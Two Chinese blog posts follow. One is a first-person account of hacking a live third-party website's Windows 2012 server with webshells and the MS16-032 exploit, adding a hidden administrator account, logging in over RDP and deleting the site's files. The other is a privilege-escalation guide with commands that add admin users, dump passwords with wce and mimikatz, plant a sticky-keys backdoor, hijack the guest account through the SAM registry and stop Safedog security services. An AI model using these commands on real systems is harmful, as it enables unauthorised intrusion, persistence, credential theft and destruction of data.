-    <div class="article-content">
-        
-        <p>这是一个黄网的站，所以我就不打码了。如果要看我是如何GetShell的可以在我博客上看另一篇“iis7.5解析GetShell”。废话不多说了，我们开始吧！<br>PS：操作很白痴，大牛勿喷——Bug’小虫</p>
-<h3 id="1-刚开始用的php一句话，发现执行不了命令"><a href="#1-刚开始用的php一句话，发现执行不了命令" class="headerlink" title="1,刚开始用的php一句话，发现执行不了命令"></a>1,刚开始用的php一句话，发现执行不了命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/13.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="2-上asp一句话，成功执行"><a href="#2-上asp一句话，成功执行" class="headerlink" title="2,上asp一句话，成功执行"></a>2,上asp一句话，成功执行</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/14.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="3-systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来"><a href="#3-systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来" class="headerlink" title="3,systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来"></a>3,systeminfo一下，发现只打了一个补丁，而且是windows2012的服务器。因此习惯性的反弹一个shll到metasploit然后用ms16-075提，但是执行了多次都反弹不回来</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8080.tmp</span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="4-上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户"><a href="#4-上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户" class="headerlink" title="4,上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户"></a>4,上传一个ms16-032，whoami一下，成功返回SYSTEM于是直接添加账户</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32.log <span class="string">"net user caibao Heimao123!@# /add"</span>//我把ms16-032改名为32.log了</span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/15.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="5-用户添加成功"><a href="#5-用户添加成功" class="headerlink" title="5,用户添加成功"></a>5,用户添加成功</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/16.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="6-提到管理员用户组"><a href="#6-提到管理员用户组" class="headerlink" title="6,提到管理员用户组"></a>6,提到管理员用户组</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">32.log <span class="string">"net localgroup administrators caibao /add"</span></span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/17.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="7-连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip"><a href="#7-连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip" class="headerlink" title="7,连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip"></a>7,连接远程桌面时，发现连接不上，于是应该端口被改了，因为他是外网ip</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/18.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="8，查看一下TermService服务对应的PID，1884"><a href="#8，查看一下TermService服务对应的PID，1884" class="headerlink" title="8，查看一下TermService服务对应的PID，1884"></a>8，查看一下TermService服务对应的PID，1884</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist /avc</span><br></pre></td></tr></table></figure>
-<p><img src="http://opgnaclz6.bkt.clouddn.com/19.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="9-根据PID查找端口，果然被他改成了"><a href="#9-根据PID查找端口，果然被他改成了" class="headerlink" title="9,根据PID查找端口，果然被他改成了"></a>9,根据PID查找端口，果然被他改成了</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/20.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"></p>
-<h3 id="10-连接远程桌面，成功连接。把它里面黄色资源一删，走人"><a href="#10-连接远程桌面，成功连接。把它里面黄色资源一删，走人" class="headerlink" title="10,连接远程桌面，成功连接。把它里面黄色资源一删，走人"></a>10,连接远程桌面，成功连接。把它里面黄色资源一删，走人</h3><p><img src="http://opgnaclz6.bkt.clouddn.com/21.png?imageView2/0/q/75|watermark/2/text/QnVnYOWwj-iZqw==/font/5qW35L2T/fontsize/500/fill/IzJDQTZDQg==/dissolve/100/gravity/SouthEast/dx/10/dy/10|imageslim"><br>总结：其实总体来说还是非常顺利的，主要是16-32提2012时不是很稳定，如果失败的话可以多试两次,或许有意向不到的收获。还有就是用metasploit反弹shell时失败，因为16-032不一定要反弹shell。所以没去研究。下次遇到的话可以从防火墙入手，查看端口规则，有可能端口被拦截。</p>
-<h3 id="—–-Powered-by-Bug’小虫"><a href="#—–-Powered-by-Bug’小虫" class="headerlink" title="—– Powered by Bug’小虫"></a>—– Powered by Bug’小虫</h3>
-        
-        
-        <p class="article-more-link">
-          
-       </p>
-    </div>
-    <footer class="article-footer clearfix">
-<div class="article-catetags">
-
-<div class="article-categories">
-  <span></span>
-  <a class="article-category-link" href="/categories/提权免杀/">提权免杀</a>►<a class="article-category-link" href="/categories/提权免杀/windows提权/">windows提权</a>
-</div>
-
-
-</div>
-
-
-
-
-<div class="comments-count">
-	
-</div>
-
-</footer>
-
-
-    </article>
-
-
-
-
-
-
-   
-    
-    <article class="post-expand post" itemprop="articleBody"> 
-        <header class="article-info clearfix">
-  <h1 itemprop="name">
-    
-      <a href="/2018/01/15/windows提权准备/" title="windows提权准备" itemprop="url">windows提权准备</a>
-  </h1>
-  <p class="article-author">By
-       
-		<a href="/about" title="小虫" target="_blank" itemprop="author">小虫</a>
-		
-  <p class="article-time">
-    <time datetime="2018-01-15T10:37:51.000Z" itemprop="datePublished"> 发表于 2018-01-15</time>
-    
-  </p>
-</header>
-    <div class="article-content">
-        
-        <h3 id="window提权基础"><a href="#window提权基础" class="headerlink" title="window提权基础"></a>window提权基础</h3><ol>
-<li><p>收集并编译相关POC</p>
-</li>
-<li><p>若操作系统有杀毒软件以及安全防护软件，则需要对提权POC进行免杀，否则进行下一步。</p>
-</li>
-<li><p>上传POC</p>
-</li>
-<li><p>有webshell或者反弹webshell来执行命令</p>
-</li>
-<li><p>搜索漏洞，根据关键字进行搜索例如MS10-061。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(1)在百度浏览器中搜索“MS10-061 site:exploit-db.com”</span><br><span class="line"></span><br><span class="line">(2)packetstormsecurity网站搜索</span><br><span class="line"></span><br><span class="line">https://packetstormsecurity.com/search/?q=MS16-016</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>(3)安全焦点，其BugTraq是一个出色的漏洞和exploit数据源，可以通过CVE编号，或者产品信息漏洞直接搜索。网址：<a href="http://www.securityfocus.com/bid。" target="_blank" rel="noopener">http://www.securityfocus.com/bid。</a></p>
-<h3 id="使用msf平台搜索可利用POC"><a href="#使用msf平台搜索可利用POC" class="headerlink" title="使用msf平台搜索可利用POC"></a>使用msf平台搜索可利用POC</h3><ol>
-<li>搜索poc</li>
-</ol>
-<p>在kali中打开msf或者执行“/usr/bin/msfconsole”，在出来的命令提示符下使用命令进行搜索：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">search ms08 </span><br><span class="line">search ms09 </span><br><span class="line">search ms10 </span><br><span class="line">search ms11 </span><br><span class="line">search ms12 </span><br><span class="line">search ms13 </span><br><span class="line">search ms14 </span><br><span class="line">search ms15 </span><br><span class="line">search ms16 </span><br><span class="line">search ms17</span><br></pre></td></tr></table></figure></p>
-<p>以上命令将搜索2008年至2017年的所有可用的Windows下的exploit，例如搜索2015年的exploit，如图1所示。</p>
-<p>搜索2015年所有可用的0day</p>
-<p>图1搜索2015年所有可用的0day</p>
-<ol start="2">
-<li>查看相关漏洞情况</li>
-</ol>
-<p>可以通过微软官方网站查看漏洞对应的版本，利用方式为<a href="https://technet.microsoft.com/library/security/漏洞号，查看ms08-068则其网页打开方式为：https://technet.microsoft.com/library/security/ms08-068，如果显示为严重则表明可以被利用。" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/漏洞号，查看ms08-068则其网页打开方式为：https://technet.microsoft.com/library/security/ms08-068，如果显示为严重则表明可以被利用。</a></p>
-<h3 id="实施提权"><a href="#实施提权" class="headerlink" title="实施提权"></a>实施提权</h3><p>执行命令。比如可利用poc文件为poc.exe，则可以使用如下的一些命令提权：</p>
-<p>(1)直接执行木马。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">poc.exe ma.exe</span><br></pre></td></tr></table></figure></p>
-<p>(2)添加用户<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">poc.exe <span class="string">"net user antian365 1qaz2wsx /add"</span> </span><br><span class="line">poc.exe <span class="string">"net localgroup administrators antian365 /add"</span></span><br></pre></td></tr></table></figure></p>
-<p>(3)获取明文密码或者哈希值<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">poc.exe <span class="string">"wce32.exe -w"</span>  </span><br><span class="line">poc.exe <span class="string">"wce64.exe -w"</span> </span><br><span class="line">poc.exe <span class="string">"wce32"</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="相关资源下载"><a href="#相关资源下载" class="headerlink" title="相关资源下载"></a>相关资源下载</h3><ol>
-<li>Tools下载</li>
-</ol>
-<p>wce下载：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://www.ampliasecurity.com/research/windows-credentials-editor/</span><br><span class="line">http://www.ampliasecurity.com/research/wce_v1_42beta_x32.zip</span><br><span class="line">http://www.ampliasecurity.com/research/wce_v1_42beta_x64.zip</span><br><span class="line">sysinternals ：https://technet.microsoft.com/en-us/sysinternals/bb842062</span><br><span class="line">mimikatz ：http://blog.gentilkiwi.com/mimikatz</span><br><span class="line">python ：https://www.python.org/downloads/windows/</span><br></pre></td></tr></table></figure></p>
-<ol start="2">
-<li>搜索漏洞和shellcode<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">http://www.exploit-db.com</span><br><span class="line">http://1337day.com</span><br><span class="line">http://0day.today</span><br><span class="line">http://www.securityfocus.com</span><br><span class="line">http://seclists.org/fulldisclosure/</span><br><span class="line">http://www.exploitsearch.net</span><br><span class="line">http://www.securiteam.com</span><br><span class="line">http://metasploit.com/modules/</span><br><span class="line">http://securityreason.com</span><br><span class="line">https://cxsecurity.com/exploit/</span><br><span class="line">http://securitytracker.com/</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h3 id="Windows本地溢出漏洞对应表"><a href="#Windows本地溢出漏洞对应表" class="headerlink" title="Windows本地溢出漏洞对应表"></a>Windows本地溢出漏洞对应表</h3><p>Windows2003对应漏洞、编号及其影响系统及msf模块</p>
-<ol>
-<li><p>2007年对应漏洞、编号及其影响系统及msf模块</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（1）KB935966 |MS07-029  Win2000SP4、Win2003SP1/SP2 exploit/windows/dcerpc/ms07_029_msdns_zonename </span><br><span class="line">exploit/windows/smb/ms07_029_msdns_zonename </span><br><span class="line">（2）KB937894| MS07-065 WinxpSP2、Win2000SP4、WinXP-x64-SP2、Win2003SP1/SP2 </span><br><span class="line">exploit/windows/dcerpc/ms07_065_msmq </span><br><span class="line">（3）KB941568|MS07-064 Win2000SP4  </span><br><span class="line">  exploit/windows/misc/ms07_064_sami </span><br><span class="line">（4）KB944653|MS07-067 WinXPSP2、WinXP-x64-SP2、Win2003SP1/SP2</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>2008年对应漏洞、编号及其影响系统及msf模块</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">（1）KB958644 |MS08-067 Win2000SP4、WinXP-SP2/SP3、 </span><br><span class="line">WinXP-64-SP/SP2、Win2003SP1/SP2、Win2003-64/SP2 </span><br><span class="line">exploit/windows/smb/ms08_067_netapi </span><br><span class="line">（2）KB 957097| MS08-068 Win2000SP4、WinXP-SP2/SP3、 </span><br><span class="line">WinXP-64-SP/SP2、Win2003SP1/SP2、Win2003-64/SP2 </span><br><span class="line">exploit/windows/smb/smb_relay</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>2009年对应漏洞、编号及其影响系统及msf模块</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（1）KB952004|MS09-012 PR Win2003/2008 </span><br><span class="line">（2）KB956572|MS09-012烤肉 </span><br><span class="line">（3）KB970483|MS09-020 IIS6 </span><br><span class="line">（4）KB971657|MS09-041 WinXP、Win2003提权 </span><br><span class="line">（5）KB975254|MS09-053 IIS5远程溢出，Windows2000SP4，Win2003及Win2008拒绝服务。 </span><br><span class="line">（6）KB975517 |MS09-050 Vista、Win2008-32/SP2、Win2008-64/SP2 </span><br><span class="line">exploit/windows/smb/ms09_050_smb2_negotiate_func_index</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>2010年对应漏洞、编号及其影响系统及msf模块</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（1）KB977165|MS10-015 Vista、Win2003-32-64/SP2、Win2008-32-64/SP2 </span><br><span class="line">exploit/windows/local/ms10_015_kitrap0d </span><br><span class="line">（2）KB 2347290|MS10-061 Winxp3、Winxp64sp2、Win2003-32-64 SP2、Win2008-32-64 SP2 </span><br><span class="line">（3）KB2360937|MS10-084 Winxp3、Winxp64sp2、Win2003-32-64 SP2 </span><br><span class="line">（4）KB2305420| MS10-092 Win7-32-64、Win2008-32-64、Win2008R2-32-64 </span><br><span class="line">exploit/windows/local/ms10_092_schelevator </span><br><span class="line">（5）KB2124261|KB2271195  MS10-065 IIS7</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>2011年对应漏洞、编号及其影响系统及msf模块</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">（1）KB2393802|MS11-011 </span><br><span class="line">Winxp32-64-SP3、Win2003-32-64-SP2、Win7-32-64-SP1、 Win2008-R2-64-SP2 </span><br><span class="line">（2）KB2478960|MS11-014 </span><br><span class="line">Winxp32-64-SP3、Win2003-32-64-SP2 </span><br><span class="line">（3）KB2507938|MS11-056 </span><br><span class="line">Winxp32-64-SP3、Win2003-32-64-SP2、Win7-32-64-SP1、 Win2008-R2-64-SP2 </span><br><span class="line">（4）KB2566454|MS11-062 </span><br><span class="line">Winxp32-64-SP3、Win2003-32-64-SP2 </span><br><span class="line">（5）KB2620712|MS11-097 </span><br><span class="line">Winxp-SP3、Win2003-SP2、Win7-64-SP1、 Win2008R2-64-SP1 </span><br><span class="line">（6）KB2503665|MS11-046 </span><br><span class="line">Winxp-SP3、Win2003-SP2、Win7-64-SP1、 Win2008R2-64-SP1 </span><br><span class="line">（7）KB2592799|MS11-080 </span><br><span class="line">Winxp-SP3、Win2003-SP2 </span><br><span class="line">exploit/windows/local/ms11_080_afdjoinleaf</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>2012年对应漏洞、编号及其影响系统及msf模块</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）KB2711167| KB2707511|KB2709715|MS12-042  sysret –pid </span><br><span class="line">Winxp-SP3、Win2003-SP2、Win7-64-SP1、 Win2008R2-64-SP1、Win8-32-64、Win2012 </span><br><span class="line">（2）KB2621440|MS12-020 Winxp-SP3、Win2003-SP2、Win7-64-SP1、 Win2008R2-64-SP1、</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>2013年对应漏洞、编号及其影响系统及msf模块</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">（1）KB2778930|MS13-005 Vista-32-64-SP2、Win2008-32-64-SP2、Win7-32-64-SP1、 Win2008R2-64-SP1、Win8-32-64、Win2012 </span><br><span class="line">exploit/windows/local/ms13_005_hwnd_broadcast </span><br><span class="line">（2）KB2840221|MS13-046 WinXP-32-SP3、WinXP-64-SP2、Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-R2-32-64-SP2、Win7-32-64-SP1、 Win2008R2-64-SP1、Win8-32-64、Win2012、Win2012R2 </span><br><span class="line">（3）KB2850851|MS13-053 EPATHOBJ 0day，WinXP-32-SP3、WinXP-64-SP2、Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-R2-32-64-SP2、Win7-32-64-SP1、 Win2008R2-64-SP1、Win8-32-64、Win2012 </span><br><span class="line">exploit/windows/local/ms13_053_schlamperei</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>2014年对应漏洞、编号及其影响系统及msf模块</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">（1）KB 2914368 |MS14-002 WinXPSP3、WinXP-64-SP2、Win2003-32-64-sp2 </span><br><span class="line">exploit/windows/local/ms_ndproxy </span><br><span class="line">（2）KB 2916607|MS14-009 Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/local/ms14_009_ie_dfsvc </span><br><span class="line">（3）KB3000061|MS14-058 Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-R2-32-64-SP2、Win7-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/local/ms14_058_track_popup_menu </span><br><span class="line">（4）KB 2989935|MS14-070 Win2003-32-64-SP2 </span><br><span class="line">exploit/windows/local/ms14_070_tcpip_ioctl</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>2015年对应漏洞、编号及其影响系统及msf模块</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">（1）KB3023266|MS15-001 Win7-32-64-SP1、Win2008R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/local/ntapphelpcachecontrol </span><br><span class="line">（2）KB3025421|MS15_004、Win7-32-64-SP1、Win2008R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/local/ms15_004_tswbproxy </span><br><span class="line">（3）KB3041836|MS15-020、Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/smb/ms15_020_shortcut_icon_dllloader </span><br><span class="line">（4）KB3057191|MS15-051 </span><br><span class="line">Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/local/ms15_051_client_copy_image </span><br><span class="line">（5）KB3077657|MS15-077 </span><br><span class="line">Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">（6）KB 3079904|MS15_078 </span><br><span class="line">Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/local/ms15_078_atmfd_bof </span><br><span class="line">（7）KB3079904|MS15-097 </span><br><span class="line">Win2003-32-64-SP2、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-R2-32-64-SP1、 Win2008R2-64-SP1、Win8-8.1-32-64、Win2012、Win2012R2 </span><br><span class="line">exploit/windows/smb/ms15_020_shortcut_icon_dllloader</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>2016年对应漏洞、编号及其影响系统及msf模块</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">（1）KB3134228|MS16-014 Win2008、Win7、Win2012 </span><br><span class="line">（2）KB3124280|MS16-016 WebDAV提权漏洞，Vista-32-64-SP2、Win2008-32-64-SP2、Win7-32-64-SP1、Win2008R2-64-SP1、Win8.1-32-64、Win2012、Win2012R2、Win10-32-64 </span><br><span class="line">exploit/windows/local/ms16_016_webdav </span><br><span class="line">（3）KB3139914|MS16-032、Vista-32-64-SP2、Win2008-32-64-SP2、Win7-32-64-SP1、Win2008R2-64-SP1、Win8.1-32-64、Win2012、Win2012R2、Win10-32-64 </span><br><span class="line">exploit/windows/local/ms16_032_secondary_logon_handle_privesc </span><br><span class="line">Windows 2003 SP2 安装了MS10-046补丁，可用ms15_020进行溢出 </span><br><span class="line">Windows 2008 SP2 (32 bits)安装了MS14-027补丁可用ms15_020进行溢出</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<h3 id="过安全狗"><a href="#过安全狗" class="headerlink" title="过安全狗"></a>过安全狗</h3><ol>
-<li>vbs法</li>
-</ol>
-<p>将以下代码保存为1.vbs然后执行cscript 1.vbs<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Set o=CreateObject( <span class="string">"Shell.Users"</span> ) </span><br><span class="line">Set z=o.create(<span class="string">"user"</span>) </span><br><span class="line">z.changePassword <span class="string">"1qaz2WSX12"</span>,<span class="string">""</span> </span><br><span class="line">z.setting(<span class="string">"AccountType"</span>)=3</span><br></pre></td></tr></table></figure></p>
-<ol start="2">
-<li><p>shift后门法</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">copy C:\sethc.exe C:\windows\system32\sethc.exe  </span><br><span class="line">copy C:\windows\system32\sethc.exe C:\windows\system32\dllcache\sethc.exe</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>for循环添加帐号法</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /l %%i <span class="keyword">in</span> (1,1,100) <span class="keyword">do</span> @net user temp asphxg /add&amp;@net localgroup administrators temp /add</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>修改注册表法</p>
-</li>
-</ol>
-<p>administrator对应值是1F4,GUEST是1F5。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(1)使用net1 user guset 1 ,将guest密码重置为1，无需过问是guest否禁用</span><br><span class="line"></span><br><span class="line">(2)执行：reg export &quot;HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\000001F4&quot; &quot;C:\RECYCLER\1.reg&quot;导出administrator的注册表值到某路径,修改内容，将&quot;V&quot;值删除，只留F值,将1F4修改为1F5,保存。</span><br><span class="line"></span><br><span class="line">(3)执行regedit /s C:\RECYCLER\1.reg 导入注册表就可以使用，guest 密码1登陆了。</span><br></pre></td></tr></table></figure></p>
-<ol start="5">
-<li><p>直接修改管理员密码法，尽量不用这招，实在没有办法就用这个。</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user administrator somepwd</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>删除与停止安全狗相关服务法</p>
-</li>
-</ol>
-<p>如果是system权限可以采取以下方法停止安全狗</p>
-<p>(1)停止安全狗相关服务<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net stop    <span class="string">"Safedog Guard Center"</span>  /y </span><br><span class="line">net stop    <span class="string">"Safedog Update Center"</span> /y </span><br><span class="line">net stop    <span class="string">"SafeDogCloudHelper"</span>  /y</span><br></pre></td></tr></table></figure></p>
